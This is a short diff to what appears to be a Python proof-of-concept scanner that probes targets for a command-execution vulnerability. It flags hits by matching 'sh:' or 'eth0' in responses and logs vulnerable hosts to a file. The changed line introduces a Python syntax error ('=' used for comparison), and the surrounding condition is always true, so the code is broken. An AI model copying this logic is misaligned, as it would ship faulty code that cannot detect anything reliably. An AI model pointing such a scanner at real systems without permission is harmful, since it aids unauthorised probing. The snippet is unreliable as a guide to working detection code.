@@ -54,7 +54,7 @@ def poc(target):
         # print(response.request.body)
         # print(response.text)
 
-        if response1.status_code != "200":
+        if response1.status_code = "200":
             if "sh:" or "s h :" or "eth0" or "e t h 0" in response1.text :
                 print(f"[++++++] {target} 存在 命令执行漏洞")
                 with open("result.txt", "a+", encoding="utf-8") as f:
